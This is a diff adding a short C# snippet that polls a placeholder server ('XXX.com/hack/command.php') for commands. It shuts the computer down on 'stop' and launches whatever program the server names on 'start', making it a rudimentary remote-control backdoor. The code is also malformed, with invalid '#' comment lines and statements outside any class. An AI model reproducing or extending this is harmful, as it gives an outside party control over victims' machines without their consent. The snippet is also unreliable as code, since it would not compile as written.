@@ -1,0 +1,38 @@
+#using stuff 
+using System; 
+using System.Collections.Generic; 
+using System.ComponentModel; 
+using System.Data; 
+using System.Drawing; 
+using System.Linq; 
+using System.Text; 
+using System.Threading.Tasks; 
+using System.Windows.Forms; 
+using System.Net; 
+using System.IO; 
+using System.Diagnostics; 
+using System.Net.NetworkInformation; 
+# end of using stuff 
+
+     WebClient client = new WebClient(); 
+    string command = client.DownloadString("http://XXX.com/hack/command.php"); 
+    if (command == "idle") 
+    { 
+
+    } 
+    else if (command == "stop") 
+    { 
+    Process.Start("shutdown", "/s /t 0"); 
+
+    } 
+    else if (command.StartsWith("start")) 
+    { 
+    string start = command.Substring(6); 
+    System.Diagnostics.Process.Start("" + start + ""); 
+
+    } 
+
+    else 
+    { 
+
+    }  
